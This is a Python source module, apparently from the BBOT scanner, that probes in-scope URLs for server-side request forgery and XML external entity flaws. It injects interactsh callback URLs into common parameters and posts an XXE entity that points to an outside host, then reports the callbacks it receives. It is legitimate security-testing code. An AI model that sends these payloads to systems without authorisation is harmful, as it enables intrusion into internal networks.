from bbot.errors import InteractshError
from bbot.modules.base import BaseModule


ssrf_params = [
    "Dest",
    "Redirect",
    "URI",
    "Path",
    "Continue",
    "URL",
    "Window",
    "Next",
    "Data",
    "Reference",
    "Site",
    "HTML",
    "Val",
    "Validate",
    "Domain",
    "Callback",
    "Return",
    "Page",
    "Feed",
    "Host",
    "Port",
    "To",
    "Out",
    "View",
    "Dir",
    "Show",
    "Navigation",
    "Open",
]


class BaseSubmodule:
    technique_description = "base technique description"
    severity = "INFO"
    paths = []

    def __init__(self, generic_ssrf):
        self.generic_ssrf = generic_ssrf
        self.test_paths = self.create_paths()

    def set_base_url(self, event):
        return f"{event.parsed_url.scheme}://{event.parsed_url.netloc}"

    def create_paths(self):
        return self.paths

    async def test(self, event):
        base_url = self.set_base_url(event)
        for test_path_result in self.test_paths:
            for lower in [True, False]:
                test_path = test_path_result[0]
                if lower:
                    test_path = test_path.lower()
                subdomain_tag = test_path_result[1]
                test_url = f"{base_url}{test_path}"
                self.generic_ssrf.debug(f"Sending request to URL: {test_url}")
                r = await self.generic_ssrf.helpers.curl(url=test_url)
                if r:
                    self.process(event, r, subdomain_tag)

    def process(self, event, r, subdomain_tag):
        response_token = self.generic_ssrf.interactsh_domain.split(".")[0][::-1]
        if response_token in r:
            echoed_response = True
        else:
            echoed_response = False

        self.generic_ssrf.interactsh_subdomain_tags[subdomain_tag] = (
            event,
            self.technique_description,
            self.severity,
            echoed_response,
        )


class Generic_SSRF(BaseSubmodule):
    technique_description = "Generic SSRF (GET)"
    severity = "HIGH"

    def set_base_url(self, event):
        return event.data

    def create_paths(self):
        test_paths = []
        for param in ssrf_params:
            query_string = ""
            subdomain_tag = self.generic_ssrf.helpers.rand_string(4)
            ssrf_canary = f"{subdomain_tag}.{self.generic_ssrf.interactsh_domain}"
            self.generic_ssrf.parameter_subdomain_tags_map[subdomain_tag] = param
            query_string += f"{param}=http://{ssrf_canary}&"
            test_paths.append((f"?{query_string.rstrip('&')}", subdomain_tag))
        return test_paths


class Generic_SSRF_POST(BaseSubmodule):
    technique_description = "Generic SSRF (POST)"
    severity = "HIGH"

    def set_base_url(self, event):
        return event.data

    async def test(self, event):
        test_url = f"{event.data}"

        post_data = {}
        for param in ssrf_params:
            subdomain_tag = self.generic_ssrf.helpers.rand_string(4, digits=False)
            self.generic_ssrf.parameter_subdomain_tags_map[subdomain_tag] = param
            post_data[param] = f"http://{subdomain_tag}.{self.generic_ssrf.interactsh_domain}"

        subdomain_tag_lower = self.generic_ssrf.helpers.rand_string(4, digits=False)
        post_data_lower = {
            k.lower(): f"http://{subdomain_tag_lower}.{self.generic_ssrf.interactsh_domain}"
            for k, v in post_data.items()
        }

        post_data_list = [(subdomain_tag, post_data), (subdomain_tag_lower, post_data_lower)]

        for tag, pd in post_data_list:
            r = await self.generic_ssrf.helpers.curl(url=test_url, method="POST", post_data=pd)
            self.process(event, r, tag)


class Generic_XXE(BaseSubmodule):
    technique_description = "Generic XXE"
    severity = "HIGH"
    paths = None

    async def test(self, event):
        rand_entity = self.generic_ssrf.helpers.rand_string(4, digits=False)
        subdomain_tag = self.generic_ssrf.helpers.rand_string(4, digits=False)

        post_body = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY {rand_entity} SYSTEM "http://{subdomain_tag}.{self.generic_ssrf.interactsh_domain}" >
]>
<foo>&{rand_entity};</foo>"""
        test_url = event.parsed_url.geturl()
        r = await self.generic_ssrf.helpers.curl(
            url=test_url, method="POST", raw_body=post_body, headers={"Content-type": "application/xml"}
        )
        if r:
            self.process(event, r, subdomain_tag)


class generic_ssrf(BaseModule):
    watched_events = ["URL"]
    produced_events = ["VULNERABILITY"]
    flags = ["active", "aggressive", "web-thorough"]
    meta = {"description": "Check for generic SSRFs", "created_date": "2022-07-30", "author": "@liquidsec"}
    options = {
        "skip_dns_interaction": False,
    }
    options_desc = {
        "skip_dns_interaction": "Do not report DNS interactions (only HTTP interaction)",
    }
    in_scope_only = True

    deps_apt = ["curl"]

    async def setup(self):
        self.submodules = {}
        self.interactsh_subdomain_tags = {}
        self.parameter_subdomain_tags_map = {}
        self.severity = None
        self.skip_dns_interaction = self.config.get("skip_dns_interaction", False)

        if self.scan.config.get("interactsh_disable", False) is False:
            try:
                self.interactsh_instance = self.helpers.interactsh()
                self.interactsh_domain = await self.interactsh_instance.register(callback=self.interactsh_callback)
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")
                return False
        else:
            self.warning(
                "The generic_ssrf module is completely dependent on interactsh to function, but it is disabled globally. Aborting."
            )
            return None

        # instantiate submodules
        for m in BaseSubmodule.__subclasses__():
            if m.__name__.startswith("Generic_"):
                self.verbose(f"Starting generic_ssrf submodule: {m.__name__}")
                self.submodules[m.__name__] = m(self)

        return True

    async def handle_event(self, event):
        for s in self.submodules.values():
            await s.test(event)

    async def interactsh_callback(self, r):
        protocol = r.get("protocol").upper()
        if protocol == "DNS" and self.skip_dns_interaction:
            return

        full_id = r.get("full-id", None)
        subdomain_tag = full_id.split(".")[0]

        if full_id:
            if "." in full_id:
                match = self.interactsh_subdomain_tags.get(subdomain_tag)
                if not match:
                    return
                matched_event = match[0]
                matched_technique = match[1]
                matched_severity = match[2]
                matched_echoed_response = str(match[3])

                triggering_param = self.parameter_subdomain_tags_map.get(subdomain_tag, None)
                description = f"Out-of-band interaction: [{matched_technique}]"
                if triggering_param:
                    self.debug(f"Found triggering parameter: {triggering_param}")
                    description += f" [Triggering Parameter: {triggering_param}]"
                description += f" [{protocol}] Echoed Response: {matched_echoed_response}"

                self.debug(f"Emitting event with description: {description}")  # Debug the final description

                event_type = "VULNERABILITY" if protocol == "HTTP" else "FINDING"
                event_data = {
                    "host": str(matched_event.host),
                    "url": matched_event.data,
                    "description": description,
                }
                if protocol == "HTTP":
                    event_data["severity"] = matched_severity

                await self.emit_event(
                    event_data,
                    event_type,
                    matched_event,
                    context=f"{{module}} scanned {matched_event.data} and detected {{event.type}}: {matched_technique}",
                )
            else:
                # this is likely caused by something trying to resolve the base domain first and can be ignored
                self.debug("skipping result because subdomain tag was missing")

    async def cleanup(self):
        if self.scan.config.get("interactsh_disable", False) is False:
            try:
                await self.interactsh_instance.deregister()
                self.debug(
                    f"successfully deregistered interactsh session with correlation_id {self.interactsh_instance.correlation_id}"
                )
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")

    async def finish(self):
        if self.scan.config.get("interactsh_disable", False) is False:
            await self.helpers.sleep(5)
            try:
                for r in await self.interactsh_instance.poll():
                    await self.interactsh_callback(r)
            except InteractshError as e:
                self.debug(f"Error in interact.sh: {e}")
